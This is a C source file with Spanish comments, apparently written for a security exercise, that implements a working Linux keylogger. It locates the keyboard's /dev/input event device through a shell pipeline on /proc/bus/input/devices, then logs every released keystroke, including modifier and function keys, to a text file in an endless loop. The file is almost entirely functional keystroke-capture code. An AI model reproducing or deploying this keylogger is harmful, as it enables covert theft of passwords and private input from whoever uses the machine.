#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <xkbcommon/xkbcommon.h>

#define LOGFILEPATH "/home/seguridad/keylogger.txt"

char *getEvent();

// Tabla de correspondencia entre los códigos de tecla y los caracteres
const char *key_table[] = {
    [KEY_A] = "a",
    [KEY_B] = "b",
    [KEY_C] = "c",
    [KEY_D] = "d",
    [KEY_E] = "e",
    [KEY_F] = "f",
    [KEY_G] = "g",
    [KEY_H] = "h",
    [KEY_I] = "i",
    [KEY_J] = "j",
    [KEY_K] = "k",
    [KEY_L] = "l",
    [KEY_M] = "m",
    [KEY_N] = "n",
    [KEY_O] = "o",
    [KEY_P] = "p",
    [KEY_Q] = "q",
    [KEY_R] = "r",
    [KEY_S] = "s",
    [KEY_T] = "t",
    [KEY_U] = "u",
    [KEY_V] = "v",
    [KEY_W] = "w",
    [KEY_X] = "x",
    [KEY_Y] = "y",
    [KEY_Z] = "z",
    [KEY_1] = "1",
    [KEY_2] = "2",
    [KEY_3] = "3",
    [KEY_4] = "4",
    [KEY_5] = "5",
    [KEY_6] = "6",
    [KEY_7] = "7",
    [KEY_8] = "8",
    [KEY_9] = "9",
    [KEY_0] = "0",
    [KEY_SPACE] = " ",
    [KEY_ENTER] = "\n",
    [KEY_BACKSPACE] = "\b",
    [KEY_TAB] = "\t",
    [KEY_LEFTSHIFT] = "[SHIFT]",
    [KEY_RIGHTSHIFT] = "[SHIFT]",
    [KEY_LEFTCTRL] = "[CTRL]",
    [KEY_RIGHTCTRL] = "[CTRL]",
    [KEY_LEFTALT] = "[ALT]",
    [KEY_RIGHTALT] = "[ALT]",
    [KEY_LEFTMETA] = "[META]",
    [KEY_RIGHTMETA] = "[META]",
    [KEY_ESC] = "[ESC]",
    [KEY_F1] = "[F1]",
    [KEY_F2] = "[F2]",
    [KEY_F3] = "[F3]",
    [KEY_F4] = "[F4]",
    [KEY_F5] = "[F5]",
    [KEY_F6] = "[F6]",
    [KEY_F7] = "[F7]",
    [KEY_F8] = "[F8]",
    [KEY_F9] = "[F9]",
    [KEY_F10] = "[F10]",
    [KEY_F11] = "[F11]",
    [KEY_F12] = "[F12]",
    [KEY_KP0] = "0",
    [KEY_KP1] = "1",
    [KEY_KP2] = "2",
    [KEY_KP3] = "3",
    [KEY_KP4] = "4",
    [KEY_KP5] = "5",
    [KEY_KP6] = "6",
    [KEY_KP7] = "7",
    [KEY_KP8] = "8",
    [KEY_KP9] = "9",

    //Teclas especiales

    [KEY_KPDOT] = ".",
    [KEY_KPENTER] = "\n",
    [KEY_KPMINUS] = "-",
    [KEY_KPPLUS] = "+",
    [KEY_KPASTERISK] = "*",
    [KEY_KPSLASH] = "/",
    [KEY_COMMA] = ",",
    [KEY_DOT] = ".",
    [KEY_SLASH] = "/",
    [KEY_SEMICOLON] = ";",
    [KEY_APOSTROPHE] = "'",
    [KEY_GRAVE] = "`",
    [KEY_LEFTBRACE] = "[",
    [KEY_RIGHTBRACE] = "]",
    [KEY_BACKSLASH] = "\\",
    [KEY_MINUS] = "-",
    [KEY_EQUAL] = "=",
    [KEY_LEFT] = "[LEFT]",
    [KEY_RIGHT] = "[RIGHT]",
    [KEY_UP] = "[UP]",
    [KEY_DOWN] = "[DOWN]",
    [KEY_PAGEUP] = "[PAGEUP]",
    [KEY_PAGEDOWN] = "[PAGEDOWN]",
    [KEY_HOME] = "[HOME]",
    [KEY_END] = "[END]",
    [KEY_INSERT] = "[INSERT]",
    [KEY_DELETE] = "[DELETE]",
    [KEY_PAUSE] = "[PAUSE]",
    [KEY_PRINT] = "[PRINT]",
    [KEY_SCROLLLOCK] = "[SCROLLLOCK]",
    [KEY_NUMLOCK] = "[NUMLOCK]",
    [KEY_CAPSLOCK] = "[CAPSLOCK]",
    [KEY_LEFTSHIFT] = "[SHIFT]",
    [KEY_RIGHTSHIFT] = "[SHIFT]",
    [KEY_LEFTALT] = "[ALT]",
    [KEY_RIGHTALT] = "[ALT]",
    [KEY_ESC] = "[ESC]",
    [KEY_KP0] = "0",
    [KEY_KP1] = "1",
    [KEY_KPDOT] = ".",
    [KEY_KPMINUS] = "-",
    [KEY_KPPLUS] = "+",
    [KEY_KPASTERISK] = "*",
    [KEY_KPSLASH] = "/",
    [KEY_COMMA] = ",",
    [KEY_DOT] = ".",
    [KEY_SLASH] = "/",
    [KEY_SEMICOLON] = ";",
    [KEY_APOSTROPHE] = "'",
    [KEY_GRAVE] = "`",
    [KEY_LEFTBRACE] = "[",
    [KEY_RIGHTBRACE] = "]",
    [KEY_MINUS] = "-",
    [KEY_EQUAL] = "=",
    [KEY_LEFT] = "[LEFT]",
    [KEY_RIGHT] = "[RIGHT]",
    [KEY_UP] = "[UP]",
    [KEY_DOWN] = "[DOWN]",
    [KEY_PAGEUP] = "[PAGEUP]",
    [KEY_PAGEDOWN] = "[PAGEDOWN]",
    [KEY_HOME] = "[HOME]",
    [KEY_END] = "[END]",
    [KEY_INSERT] = "[INSERT]",
    [KEY_DELETE] = "[DELETE]",
    [KEY_PAUSE] = "[PAUSE]",
    [KEY_PRINT] = "[PRINT]",
    [KEY_SCROLLLOCK] = "[SCROLLLOCK]",
    [KEY_NUMLOCK] = "[NUMLOCK]",
    [KEY_CAPSLOCK] = "[CAPSLOCK]",
};

int main() {
    struct input_event ev;
    // ruta al directorio de inputs
    static char path_keyboard[20] = "/dev/input/";
    // concatenar variable keyboard
    strcat(path_keyboard, getEvent());
    // eliminar último caracter (breakline)
    path_keyboard[strlen(path_keyboard) - 1] = 0;
    // leer ruta a input
    int device_keyboard = open(path_keyboard, O_RDONLY);
    // imprimir error
    if (device_keyboard == -1) {
        printf("Error: %d\n", errno);
        return 1;
    }
    // abrir fichero de logs
    FILE *fp = fopen(LOGFILEPATH, "a");
    if (fp == NULL) {
        printf("Error: %d\n", errno);
        return 1;
    }

    while (1) {
        read(device_keyboard, &ev, sizeof(ev));
        if (ev.type == EV_KEY && ev.value == 0) {
            const char *character = key_table[ev.code];
            if (character) {
                fprintf(fp, "%s", character);
                fflush(fp);  // Asegura que los datos se escriban en el archivo inmediatamente
            }
        }
    }

    fclose(fp);
    close(device_keyboard);
    return 0;
}

char *getEvent() {
    // leer el fichero devices y extraer el input que se refiera al teclado
    char *command = (char *) "cat /proc/bus/input/devices | grep -C 5 keyboard | grep -E -o 'event[0-9]'";
    static char event[8];
    FILE *pipe = popen(command, "r");
    if (!pipe) {
        exit(1);
    }
    // obtener la cadena de texto del evento correspondiente al teclado
    fgets(event, 8, pipe);
    pclose(pipe);
    // retornar el evento
    return event;
}